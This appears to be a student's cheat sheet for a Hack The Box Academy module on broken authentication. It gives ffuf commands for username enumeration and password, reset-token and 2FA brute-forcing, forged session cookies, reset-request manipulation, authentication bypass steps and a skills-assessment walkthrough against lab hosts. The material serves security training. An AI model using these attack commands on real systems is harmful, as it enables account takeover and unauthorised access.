# What is Authentication

**Commands**

**Payloads**

**Tools**

**Paths / Endpoints**

```text
https://academy.hackthebox.com/login
```

**Code Blocks**

**Requests / Credentials**


# Attacks on Authentication 

**Commands**

**Payloads**

**Tools**

**Paths / Endpoints**

**Code Blocks**

**Requests / Credentials**




# Enumerating Users 

**Commands**

```shell
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

**Payloads**

```text
username=FUZZ&password=invalid
```

**Tools**

ffuf SecLists

**Paths / Endpoints**

```text
http://<SERVER_IP>:<PORT>/index.php
http://<SERVER_IP>:<PORT>/
http://wordpress.htb/
```

**Wordlists**

```text
/opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt
https://github.com/danielmiessler/SecLists/tree/master/Usernames
```

**Error Message Strings (filter anchors)**

```text
Unknown user
Invalid credentials
```

**Code Blocks**

**Requests / Credentials**

```text
username: htb-stdnt
username: consuelo
```

# Brute-Forcing Passwords 

**Commands**

```shell
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```shell
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

```shell
wc -l custom_wordlist.txt
```

```shell
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt
```

```shell
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

**Payloads**

```text
username=admin&password=FUZZ
```

**Tools**

ffuf grep awk SecLists

**Paths / Endpoints**

```text
http://<SERVER_IP>:<PORT>/index.php
http://<SERVER_IP>:<PORT>/admin.php
http://172.17.0.2/index.php
/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

**Wordlists**

```text
/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
./custom_wordlist.txt
```

**Error Message Strings (filter anchors)**

```text
Invalid username
Invalid username or password.
```

**Credentials**

```text
username: admin
password: Buttercup1
```


# Brute-Forcing Password Reset Tokens 

**Commands**

```shell
seq -w 0 9999 > tokens.txt
```

```shell
head tokens.txt
```

```shell
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

**Payloads**

```text
token=FUZZ
```

**Tools**

ffuf seq

**Paths / Endpoints**

```text
http://weak_reset.htb/reset_password.php?token=FUZZ
http://<SERVER_IP>:<PORT>/reset_password.php
```

**Parameters**

```text
token
```

**Wordlists**

```text
./tokens.txt
```

**Token Range**

```text
0000-9999
```

**Error Message Strings (filter anchors)**

```text
The provided token is invalid
```

**Discovered Tokens / Credentials**

```text
token: 6182
target account: admin
```


# Brute-Forcing 2FA Codes

**Commands**

```shell
seq -w 0 9999 > tokens.txt
```

```shell
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

**Payloads**

```text
otp=FUZZ
```

**Tools**

ffuf seq

**Paths / Endpoints**

```text
http://<SERVER_IP>:<PORT>/2fa.php
http://bf_2fa.htb/2fa.php
http://<SERVER_IP>:<PORT>/admin.php
```

**Parameters**

```text
otp
PHPSESSID
```

**Cookies**

```text
PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93
```

**Wordlists**

```text
./tokens.txt
```

**Token Range**

```text
0000-9999
```

**Error Message Strings (filter anchors)**

```text
Invalid 2FA Code
```

**Credentials / Discovered Values**

```text
username: admin
password: admin
TOTP: 6513
```

# Weak Brute-Force Protection

**Commands**

**Payloads**

**Tools**

**Paths / Endpoints**

```text
http://captcha.htb/
```

**Headers (bypass vector)**

```text
X-Forwarded-For
```

**CVEs**

```text
CVE-2020-35590
```

**Code Blocks**

**Requests / Credentials**

# Default Credentials 

**Commands**

**Payloads**

**Tools**

**Paths / Endpoints**

```text
http://bookstack.htb
https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/tree/master
```

**Search Queries**

```text
bookstack default credentials
```

**Default Credentials**

```text
admin@admin.com:password
admin:password
```

**Code Blocks**

**Requests / Credentials**

# Vulnerable Password Reset 

**Commands**

```shell
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

```shell
wc -l city_wordlist.txt
```

```shell
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```

```shell
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

```shell
wc -l german_cities.txt
```

**Payloads**

```text
security_response=FUZZ
```

**Manipulated Reset Requests**

```http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

**Tools**

ffuf cut grep

**Paths / Endpoints**

```text
http://<SERVER_IP>:<PORT>/reset.php
http://<SERVER_IP>:<PORT>/security_question.php
http://<SERVER_IP>:<PORT>/reset_password.php
http://pwreset.htb/security_question.php
http://pwreset.htb/reset_password.php
```

**Parameters**

```text
security_response
username
password
PHPSESSID
```

**Cookies**

```text
PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
```

**Wordlists**

```text
./city_wordlist.txt
./german_cities.txt
world-cities.csv
```

**Error Message Strings (filter anchors)**

```text
Incorrect response.
```

**Credentials / Discovered Values**

```text
username: admin
username: htb-stdnt
security_response: Houston
security_response: London
password: P@$$w0rd
```

# Authentication Bypass via Direct Access 

**Commands**

**Payloads**

**Vulnerable Code**

```php
if(!$_SESSION['active']) {
    header("Location: index.php");
}
```

**Fixed Code**

```php
if(!$_SESSION['active']) {
    header("Location: index.php");
    exit;
}
```

**Tools**

Burp Suite

**Paths / Endpoints**

```text
http://<SERVER_IP>:<PORT>/admin.php
/admin.php
/index.php
```

**Response Modification**

```text
302 Found -> 200 OK
```

**Burp Steps**

```text
Enable Intercept
Browse to /admin.php
Right-click request > Do intercept > Response to this request
Forward request
Change status code: 302 Found -> 200 OK
Forward response
```

**Code Blocks**

**Requests / Credentials**

```http
GET /admin.php HTTP/1.1
Host: 172.17.0.2
```


# Authentication Bypass via Parameter Modification 

**Commands**

**Payloads**

**Tools**

Burp Suite

**Paths / Endpoints**

```text
http://<SERVER_IP>:<PORT>/admin.php
http://<SERVER_IP>:<PORT>/admin.php?user_id=183
/admin.php?user_id=183
/admin.php
/index.php
```

**Parameters**

```text
user_id
user_id=183
PHPSESSID
```

**Requests**

```http
POST /index.php HTTP/1.1
Host: <SERVER_IP>:<PORT>

username=htb-stdnt&password=AcademyStudent%21
```

```http
GET /admin.php?user_id=183 HTTP/1.1
Host: <SERVER_IP>:<PORT>
Cookie: PHPSESSID=<session>
```

**Credentials**

```text
username: htb-stdnt
password: AcademyStudent!
```

**Privilege Escalation Target**

```text
user_id=<admin_id> (brute-force to identify)
```

# Attacking Session Tokens 

**Commands**

```shell
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
```

```shell
echo -n 'user=htb-stdnt;role=admin' | base64
```

```shell
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```

**Payloads**

**Forged Cookies (base64)**

```text
session=dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```

**Forged Cookies (hex)**

```text
session=757365723d6874622d7374646e743b726f6c653d61646d696e
```

**Decoded Token Data**

```text
user=htb-stdnt;role=user
user=htb-stdnt;role=admin
```

**Tools**

Burp Suite base64 xxd

**Paths / Endpoints**

```text
/index.php
/admin.php
```

**Parameters / Cookies**

```text
session
PHPSESSID
```

**Captured Weak Session Tokens (static-dynamic pattern)**

```text
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

**Captured Weak Session Tokens (incrementing)**

```text
141233
141234
141237
141238
141240
```

**Captured Weak Session Token (short)**

```text
session=a5fd
```

**Captured Weak Session Token (base64)**

```text
session=dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy
```

**Captured Weak Session Token (hex)**

```text
session=757365723d6874622d73746d6e743b726f6c653d75736572
```

**Credentials**

```text
username: htb-stdnt
password: AcademyStudent!
```

# Further Session Attacks 

**Commands**

**Payloads**

**Session Fixation Link (attacker-crafted)**

```text
http://vulnerable.htb/?sid=a1b2c3d4e5f6
```

**Session Fixation Response (server sets attacker-chosen token)**

```http
HTTP/1.1 200 OK
Set-Cookie: session=a1b2c3d4e5f6
```

**Tools**

**Paths / Endpoints**

```text
http://vulnerable.htb/?sid=a1b2c3d4e5f6
```

**Parameters / Cookies**

```text
sid
session
session=a1b2c3d4e5f6
```

**Code Blocks**

**Requests / Credentials**

# Skills Assessment

**Commands**

```shell
ffuf -u http://154.57.164.77:31233/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

```shell
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.77:31233/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown username or password."
```

```shell
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-u http://154.57.164.77:31233/login.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=FUZZ&password=test" \
-fs 4353
```

```shell
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
-u http://154.57.164.77:31233/login.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=Gladys&password=FUZZ" \
-fs 4344
```

```shell
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u http://154.57.164.77:31233/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials."
```

```shell
ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u http://154.57.164.77:31233/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fs 4344
```

```shell
awk 'length==12 && /[a-z]/ && /[A-Z]/ && /[0-9]/ && /^[A-Za-z0-9]+$/' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > rockyou_policy_Broken.txt
```

```shell
ffuf -w rockyou_policy_Broken.txt -u http://154.57.164.77:31233/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fs 4344
```

```shell
curl -c login_cookies.txt -i -X POST http://154.57.164.72:31149/login.php \
  -d "username=gladys&password=dWinaldasD13" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

```shell
grep PHPSESSID login_cookies.txt
```

```shell
curl -b login_cookies.txt -i http://154.57.164.72:31149/dashboard.php
```

```shell
curl -b login_cookies.txt -i http://154.57.164.72:31149/profile.php
```

```shell
curl -b login_cookies.txt -i http://154.57.164.72:31149/admin.php
```

```shell
curl -b login_cookies.txt -i http://154.57.164.72:31149/home.php
```

```shell
curl -b login_cookies.txt -i http://154.57.164.72:31149/flag.txt
```

**Payloads**

```text
username=FUZZ&password=invalid
username=FUZZ&password=test
username=gladys&password=FUZZ
username=Gladys&password=FUZZ
username=gladys&password=dWinaldasD13
```

**Tools**

ffuf curl awk grep

**Paths / Endpoints**

```text
http://154.57.164.77:31233/
http://154.57.164.77:31233/login.php
http://154.57.164.77:31233/index.php
http://154.57.164.72:31149/login.php
http://154.57.164.72:31149/2fa.php
http://154.57.164.72:31149/dashboard.php
http://154.57.164.72:31149/profile.php
http://154.57.164.72:31149/admin.php
http://154.57.164.72:31149/home.php
http://154.57.164.72:31149/flag.txt
```

**Parameters / Cookies**

```text
username
password
PHPSESSID=51iklldfjfr1b7qjp8rqao7s5p
```

**Wordlists**

```text
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
rockyou_policy_Broken.txt
```

**Error Message Strings (filter anchors)**

```text
Unknown username or password.
Invalid credentials.
```

**Filter Sizes**

```text
-fs 4353
-fs 4344
```

**Credentials / Discovered Values**

```text
username: gladys
password: dWinaldasD13
PHPSESSID: 51iklldfjfr1b7qjp8rqao7s5p
```

**Flag**

```text
HTB{flag}
```

**Cookie File**

```text
login_cookies.txt
```